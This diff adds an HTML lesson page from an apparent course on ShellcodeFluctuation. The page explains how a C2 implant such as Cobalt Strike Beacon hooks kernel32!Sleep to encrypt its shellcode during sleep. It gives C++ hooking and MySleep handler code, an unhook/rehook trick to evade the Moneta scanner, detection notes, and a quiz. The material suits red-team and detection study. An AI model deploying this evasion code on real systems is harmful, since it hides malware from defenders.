@@ -1,0 +1,337 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Module 4: Sleep Function Hooking - ShellcodeFluctuation Course</title>
+<link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><text y='.9em' font-size='90'>&#x1F4A0;</text></svg>">
+<link rel="stylesheet" href="../../../assets/course.css">
+<style>:root{--accent:#10b981;--accent2:#059669;--gradient:linear-gradient(135deg,#10b981,#059669)}</style>
+</head>
+<body>
+
+<button class="hamburger" onclick="document.querySelector('nav').classList.toggle('open')">&#9776;</button>
+<nav>
+  <div class="logo"><h2>ShellcodeFluctuation</h2><span>Memory Fluctuation Masterclass</span></div>
+  <a class="home-link" href="../ShellcodeFluctuation_index.html">&larr; Course Home</a>
+  <a class="mod-link" href="module1.html"><span>1. Memory Scanning Threat Model</span><span class="diff d1">d1</span></a>
+  <a class="mod-link" href="module2.html"><span>2. XOR Encryption for Memory</span><span class="diff d1">d1</span></a>
+  <a class="mod-link" href="module3.html"><span>3. VirtualProtect &amp; Pages</span><span class="diff d1">d1</span></a>
+  <a class="mod-link active" href="module4.html"><span>4. Sleep Function Hooking</span><span class="diff d2">d2</span></a>
+  <a class="mod-link" href="module5.html"><span>5. The Fluctuation Algorithm</span><span class="diff d2">d2</span></a>
+  <a class="mod-link" href="module6.html"><span>6. Shellcode Region Tracking</span><span class="diff d2">d2</span></a>
+  <a class="mod-link" href="module7.html"><span>7. Thread Stack Spoofing</span><span class="diff d3">d3</span></a>
+  <a class="mod-link" href="module8.html"><span>8. Full Chain &amp; Detection</span><span class="diff d3">d3</span></a>
+</nav>
+
+<main>
+<span class="diff-badge med">Difficulty: Intermediate</span>
+<h1>Module 4: Sleep Function Hooking</h1>
+<p class="subtitle">How ShellcodeFluctuation intercepts kernel32!Sleep via inline hooking to gain control before and after the implant sleeps.</p>
+
+<div class="card highlight">
+<h4>Module Objective</h4>
+<p>Understand how inline function hooking works, why ShellcodeFluctuation hooks <code>kernel32!Sleep</code> specifically, the trampoline mechanism for calling the original function, the <code>MySleep</code> handler architecture, and why the hook is temporarily removed during the actual sleep call.</p>
+</div>
+
+<!-- ============================================================ -->
+<h2>1. Why Hook Sleep?</h2>
+
+<p>Cobalt Strike Beacon (and most C2 implants) calls <code>kernel32!Sleep</code> to pause between check-ins. This is the natural interception point for ShellcodeFluctuation because:</p>
+
+<div class="card">
+<h4>Sleep as the Interception Target</h4>
+<ul>
+<li><strong>Guaranteed to be called</strong> &mdash; every beacon cycle includes a sleep. The implant cannot avoid calling it</li>
+<li><strong>Called from within the implant</strong> &mdash; the call originates from the shellcode itself, so hooking Sleep intercepts at exactly the right moment</li>
+<li><strong>Single point of control</strong> &mdash; one hook gives control over every transition between active and idle states</li>
+<li><strong>Natural boundary</strong> &mdash; Sleep marks the exact moment when the implant transitions from "doing work" to "waiting" &mdash; the ideal time to encrypt</li>
+<li><strong>Known function signature</strong> &mdash; <code>void WINAPI Sleep(DWORD dwMilliseconds)</code> has a single parameter, making it easy to wrap</li>
+</ul>
+</div>
+
+<!-- ============================================================ -->
+<h2>2. Inline Hooking vs IAT Hooking</h2>
+
+<p>There are two primary approaches to hooking a Windows API function. ShellcodeFluctuation uses inline hooking:</p>
+
+<table>
+<tr><th>Method</th><th>Mechanism</th><th>Pros</th><th>Cons</th></tr>
+<tr><td><strong>IAT Hooking</strong></td><td>Modify the Import Address Table entry for <code>Sleep</code> to point to the hook function</td><td>No code modification; works with the PE loader</td><td>Only affects imports through the hooked module's IAT; does not catch calls from other modules or via <code>GetProcAddress</code></td></tr>
+<tr><td><strong>Inline Hooking</strong></td><td>Overwrite the first bytes of <code>kernel32!Sleep</code> with a JMP to the hook function</td><td>Catches ALL calls to Sleep regardless of how they are resolved</td><td>Modifies mapped DLL code (triggers copy-on-write); must save original bytes for trampoline</td></tr>
+</table>
+
+<p>ShellcodeFluctuation uses <strong>inline hooking</strong> because Cobalt Strike Beacon resolves <code>Sleep</code> via <code>GetProcAddress</code> at runtime, bypassing the IAT entirely. An IAT hook would never intercept the call.</p>
+
+<!-- ============================================================ -->
+<h2>3. Inline Hook Mechanics</h2>
+
+<p>An inline hook replaces the first instructions of the target function with a jump to the hook handler. The original instructions are preserved in a "trampoline" so the original function can still be called.</p>
+
+<pre><code class="language-cpp">// kernel32!Sleep original bytes (x64):
+// 48 89 5C 24 08     mov  [rsp+8], rbx
+// 57                 push rdi
+// 48 83 EC 40        sub  rsp, 0x40
+// ...
+
+// After inline hook installation:
+// E9 XX XX XX XX     jmp  MySleep        ; 5-byte relative jump
+// 57                 push rdi            ; leftover byte (unreachable)
+// 48 83 EC 40        sub  rsp, 0x40
+// ...</code></pre>
+
+<div class="card">
+<h4>Hook Installation Steps</h4>
+<ol>
+<li><strong>Resolve target address</strong> &mdash; get the address of <code>kernel32!Sleep</code> via <code>GetProcAddress</code></li>
+<li><strong>Save original bytes</strong> &mdash; copy the first N bytes from the function prologue (enough for the JMP instruction)</li>
+<li><strong>Make writable</strong> &mdash; <code>VirtualProtect</code> the target page to <code>PAGE_EXECUTE_READWRITE</code></li>
+<li><strong>Write JMP</strong> &mdash; overwrite the first bytes with a relative or absolute JMP to <code>MySleep</code></li>
+<li><strong>Restore protection</strong> &mdash; <code>VirtualProtect</code> back to <code>PAGE_EXECUTE_READ</code></li>
+<li><strong>Build trampoline</strong> &mdash; allocate a small code region containing the saved bytes followed by a JMP back to <code>Sleep+N</code></li>
+</ol>
+</div>
+
+<pre><code class="language-cpp">// Simplified inline hook installation
+BOOL InstallHook(LPVOID targetFunc, LPVOID hookFunc, LPVOID* trampoline) {
+    const int HOOK_SIZE = 5;  // Size of E9 rel32 JMP on x86
+                               // On x64 we may need more bytes for far JMP
+
+    // 1. Allocate trampoline
+    *trampoline = VirtualAlloc(NULL, 64, MEM_COMMIT | MEM_RESERVE,
+                               PAGE_EXECUTE_READWRITE);
+
+    // 2. Copy original bytes to trampoline
+    memcpy(*trampoline, targetFunc, HOOK_SIZE);
+
+    // 3. Append JMP back to targetFunc + HOOK_SIZE
+    BYTE* trampolineJmp = (BYTE*)*trampoline + HOOK_SIZE;
+    trampolineJmp[0] = 0xE9;  // relative JMP
+    *(DWORD*)(trampolineJmp + 1) =
+        (DWORD)((BYTE*)targetFunc + HOOK_SIZE - (trampolineJmp + 5));
+
+    // 4. Write JMP to hookFunc at target
+    DWORD oldProt;
+    VirtualProtect(targetFunc, HOOK_SIZE, PAGE_EXECUTE_READWRITE, &oldProt);
+    ((BYTE*)targetFunc)[0] = 0xE9;  // relative JMP
+    *(DWORD*)((BYTE*)targetFunc + 1) =
+        (DWORD)((BYTE*)hookFunc - ((BYTE*)targetFunc + 5));
+    VirtualProtect(targetFunc, HOOK_SIZE, oldProt, &oldProt);
+
+    return TRUE;
+}</code></pre>
+
+<!-- ============================================================ -->
+<h2>4. The x64 Long-Jump Problem</h2>
+
+<p>On x86-64, a 5-byte relative JMP (<code>E9</code>) can only reach addresses within +/- 2 GB of the instruction. Since <code>kernel32.dll</code> and the hook function may be more than 2 GB apart in the 64-bit address space, ShellcodeFluctuation may need to use a longer jump sequence:</p>
+
+<pre><code class="language-cpp">// Option 1: Relative JMP (5 bytes) - works if within 2 GB
+// E9 [rel32]
+// Range: +/- 2,147,483,647 bytes
+
+// Option 2: Absolute indirect JMP (14 bytes) - works anywhere
+// FF 25 00 00 00 00     jmp [rip+0]
+// XX XX XX XX XX XX XX XX   ; 8-byte absolute address
+
+// ShellcodeFluctuation approach:
+// Uses 14-byte absolute JMP when the hook function is
+// more than 2 GB from the target
+void WriteAbsoluteJmp(BYTE* target, LPVOID destination) {
+    // FF 25 00 00 00 00 = jmp qword ptr [rip+0]
+    target[0] = 0xFF;
+    target[1] = 0x25;
+    *(DWORD*)(target + 2) = 0;  // RIP-relative offset = 0
+    *(UINT64*)(target + 6) = (UINT64)destination;
+    // Total: 14 bytes
+}</code></pre>
+
+<div class="card warn">
+<h4>Byte Count Matters</h4>
+<p>The number of original bytes overwritten must align with instruction boundaries. Overwriting the middle of an instruction creates invalid code in the trampoline. Tools like a length-disassembly engine (LDE) are used to calculate the exact number of bytes to copy, ensuring complete instructions are preserved.</p>
+</div>
+
+<!-- ============================================================ -->
+<h2>5. The MySleep Handler</h2>
+
+<p>The hook redirects all calls to <code>kernel32!Sleep</code> to ShellcodeFluctuation's <code>MySleep</code> function. This is the heart of the fluctuation mechanism:</p>
+
+<pre><code class="language-cpp">// Global state
+LPVOID  g_shellcodeBase = nullptr;
+SIZE_T  g_shellcodeSize = 0;
+DWORD   g_xorKey = 0;
+LPVOID  g_sleepTrampoline = nullptr;  // Trampoline to original Sleep
+
+// The hook handler - called instead of kernel32!Sleep
+void WINAPI MySleep(DWORD dwMilliseconds) {
+    // Phase 1: ENCRYPT
+    // Flip shellcode to writable
+    DWORD oldProt;
+    VirtualProtect(g_shellcodeBase, g_shellcodeSize,
+                   PAGE_READWRITE, &oldProt);
+
+    // XOR encrypt the shellcode region
+    xor32((BYTE*)g_shellcodeBase, g_shellcodeSize, g_xorKey);
+
+    // Phase 2: SLEEP
+    // Call original Sleep via trampoline
+    typedef void (WINAPI* fnSleep)(DWORD);
+    ((fnSleep)g_sleepTrampoline)(dwMilliseconds);
+
+    // Phase 3: DECRYPT
+    // XOR decrypt the shellcode region
+    xor32((BYTE*)g_shellcodeBase, g_shellcodeSize, g_xorKey);
+
+    // Flip shellcode back to executable
+    VirtualProtect(g_shellcodeBase, g_shellcodeSize,
+                   PAGE_EXECUTE_READ, &oldProt);
+}
+// Execution returns to the shellcode, which continues normally</code></pre>
+
+<div class="diagram">
+<h4 style="color:var(--accent);margin-bottom:15px;text-align:center">MySleep Execution Flow</h4>
+<div class="flow">
+<div class="flow box">Beacon calls<br><code>Sleep(60000)</code></div>
+<div class="flow arrow">&rarr;</div>
+<div class="flow box">JMP to<br><code>MySleep</code></div>
+<div class="flow arrow">&rarr;</div>
+<div class="flow box">Encrypt +<br>Flip to RW</div>
+<div class="flow arrow">&rarr;</div>
+<div class="flow box">Original<br><code>Sleep()</code></div>
+<div class="flow arrow">&rarr;</div>
+<div class="flow box">Decrypt +<br>Flip to RX</div>
+<div class="flow arrow">&rarr;</div>
+<div class="flow box">Return to<br>Beacon</div>
+</div>
+</div>
+
+<!-- ============================================================ -->
+<h2>6. Why Unhook Before Sleeping</h2>
+
+<p>A critical detail in ShellcodeFluctuation's implementation: the inline hook on <code>kernel32!Sleep</code> is <strong>temporarily removed</strong> before the actual sleep call and <strong>reinstalled</strong> after waking. This is done to eliminate the "Modified code" IOC in Moneta:</p>
+
+<pre><code class="language-cpp">// Improved MySleep with hook/unhook cycle
+void WINAPI MySleep(DWORD dwMilliseconds) {
+    // Phase 1: ENCRYPT
+    DWORD oldProt;
+    VirtualProtect(g_shellcodeBase, g_shellcodeSize,
+                   PAGE_READWRITE, &oldProt);
+    xor32((BYTE*)g_shellcodeBase, g_shellcodeSize, g_xorKey);
+
+    // Phase 1.5: UNHOOK Sleep
+    // Restore original bytes to kernel32!Sleep
+    DWORD hookProt;
+    VirtualProtect(g_sleepFunc, g_hookSize,
+                   PAGE_EXECUTE_READWRITE, &hookProt);
+    memcpy(g_sleepFunc, g_originalBytes, g_hookSize);
+    VirtualProtect(g_sleepFunc, g_hookSize, hookProt, &hookProt);
+
+    // Phase 2: SLEEP (with clean kernel32)
+    Sleep(dwMilliseconds);  // Direct call - no hook in place
+
+    // Phase 3: RE-HOOK Sleep
+    VirtualProtect(g_sleepFunc, g_hookSize,
+                   PAGE_EXECUTE_READWRITE, &hookProt);
+    memcpy(g_sleepFunc, g_hookBytes, g_hookSize);
+    VirtualProtect(g_sleepFunc, g_hookSize, hookProt, &hookProt);
+
+    // Phase 4: DECRYPT
+    xor32((BYTE*)g_shellcodeBase, g_shellcodeSize, g_xorKey);
+    VirtualProtect(g_shellcodeBase, g_shellcodeSize,
+                   PAGE_EXECUTE_READ, &oldProt);
+}</code></pre>
+
+<div class="card green">
+<h4>Why This Matters</h4>
+<p>During the sleep window (when scanners are most likely to scan), <code>kernel32!Sleep</code> contains its original, unmodified bytes. Moneta comparing in-memory kernel32 against the on-disk file will find no differences. The hook is only present during the brief active window when the implant is executing &mdash; the same window that is already too short for reliable scanning.</p>
+</div>
+
+<div class="card warn">
+<h4>The Persistent IOC</h4>
+<p>Even with the unhook/rehook cycle, the copy-on-write page persists. Writing to kernel32's .text section (even temporarily) converts the shared page to a private page. Moneta can detect that kernel32 has private pages in its .text section, even if the content matches the on-disk file. However, the IOC message changes from "Modified code" (suspicious) to a weaker working-set anomaly (less suspicious, as legitimate processes can also cause private pages).</p>
+</div>
+
+<!-- ============================================================ -->
+<h2>7. Hook/Unhook Timing Window</h2>
+
+<p>Understanding the exact timing of when the hook is present vs absent is critical for evaluating the technique's effectiveness:</p>
+
+<table>
+<tr><th>Phase</th><th>Hook Present?</th><th>Shellcode State</th><th>Duration</th><th>Scanner Risk</th></tr>
+<tr><td>Active execution</td><td>Yes</td><td>RX + Cleartext</td><td>~100ms</td><td>Hook detectable, shellcode scannable (but brief)</td></tr>
+<tr><td>MySleep entry</td><td>Yes</td><td>Transitioning</td><td>~microseconds</td><td>Minimal</td></tr>
+<tr><td>After unhook</td><td><strong>No</strong></td><td>RW + Encrypted</td><td>~60 seconds</td><td><strong>Neither hook nor shellcode detectable</strong></td></tr>
+<tr><td>After rehook</td><td>Yes</td><td>Transitioning</td><td>~microseconds</td><td>Minimal</td></tr>
+<tr><td>Active execution</td><td>Yes</td><td>RX + Cleartext</td><td>~100ms</td><td>Hook detectable, shellcode scannable (but brief)</td></tr>
+</table>
+
+<!-- ============================================================ -->
+<h2>8. Trampoline vs Direct Call</h2>
+
+<p>After unhooking Sleep, the implementation can call <code>Sleep</code> directly rather than through the trampoline. This is a cleaner approach because the trampoline is no longer needed once the original bytes are restored:</p>
+
+<pre><code class="language-cpp">// Two approaches to calling original Sleep:
+
+// Approach 1: Via trampoline (used when hook stays in place)
+// The trampoline contains:
+//   [original bytes from Sleep prologue]
+//   [JMP back to Sleep + hookSize]
+// This allows calling original Sleep without removing the hook.
+
+// Approach 2: Direct call after unhooking (ShellcodeFluctuation)
+// Since we restore original bytes before sleeping:
+//   1. Unhook: restore original bytes to kernel32!Sleep
+//   2. Call Sleep() directly - it's now unmodified
+//   3. Rehook: install JMP bytes again
+// Cleaner: no trampoline allocation, no extra executable memory</code></pre>
+
+<div class="card">
+<h4>Approach Comparison</h4>
+<table>
+<tr><th>Factor</th><th>Trampoline (hook stays)</th><th>Unhook/Rehook (ShellcodeFluctuation)</th></tr>
+<tr><td>Hook visible during sleep?</td><td>Yes &mdash; kernel32 modified</td><td>No &mdash; kernel32 clean</td></tr>
+<tr><td>Extra allocation?</td><td>Yes &mdash; trampoline is executable private memory</td><td>No &mdash; original function used directly</td></tr>
+<tr><td>Complexity</td><td>Simpler (one-time setup)</td><td>More complex (restore/reinstall per cycle)</td></tr>
+<tr><td>Performance</td><td>Slightly faster (no memcpy per cycle)</td><td>Slightly slower (two memcpy per cycle)</td></tr>
+<tr><td>Stealth</td><td>Lower &mdash; hook always visible</td><td>Higher &mdash; hook only visible during execution</td></tr>
+</table>
+</div>
+
+<!-- ============================================================ -->
+<div class="quiz">
+<h2>Knowledge Check</h2>
+
+<div class="quiz-q" data-answer="B">
+<p>Q1: Why does ShellcodeFluctuation use inline hooking rather than IAT hooking for kernel32!Sleep?</p>
+<div class="quiz-btn" data-choice="A">A) IAT hooking is harder to implement</div>
+<div class="quiz-btn" data-choice="B">B) Cobalt Strike resolves Sleep via GetProcAddress at runtime, bypassing the IAT</div>
+<div class="quiz-btn" data-choice="C">C) Inline hooking is undetectable by all scanners</div>
+<div class="quiz-btn" data-choice="D">D) IAT hooking requires kernel-mode access</div>
+</div>
+
+<div class="quiz-q" data-answer="C">
+<p>Q2: Why is the Sleep hook temporarily removed before the actual sleep call?</p>
+<div class="quiz-btn" data-choice="A">A) The hook interferes with the Sleep timer</div>
+<div class="quiz-btn" data-choice="B">B) Windows requires unhooked functions for proper thread scheduling</div>
+<div class="quiz-btn" data-choice="C">C) To eliminate the "Modified code in kernel32" IOC during the long sleep window</div>
+<div class="quiz-btn" data-choice="D">D) The hook code would be encrypted along with the shellcode</div>
+</div>
+
+<div class="quiz-q" data-answer="A">
+<p>Q3: What is the purpose of a trampoline in inline hooking?</p>
+<div class="quiz-btn" data-choice="A">A) It preserves the overwritten original bytes and jumps back, allowing the original function to be called</div>
+<div class="quiz-btn" data-choice="B">B) It encrypts the hook bytes to avoid detection</div>
+<div class="quiz-btn" data-choice="C">C) It provides a backup copy of the entire target DLL</div>
+<div class="quiz-btn" data-choice="D">D) It implements the XOR encryption algorithm</div>
+</div>
+</div>
+
+<div class="nav-btns">
+<a href="module3.html">&larr; Prev: VirtualProtect &amp; Page Permissions</a>
+<a class="primary" href="module5.html">Next: The Fluctuation Algorithm &rarr;</a>
+</div>
+</main>
+
+<script src="../../../assets/course.js"></script>
+</body>
+</html>
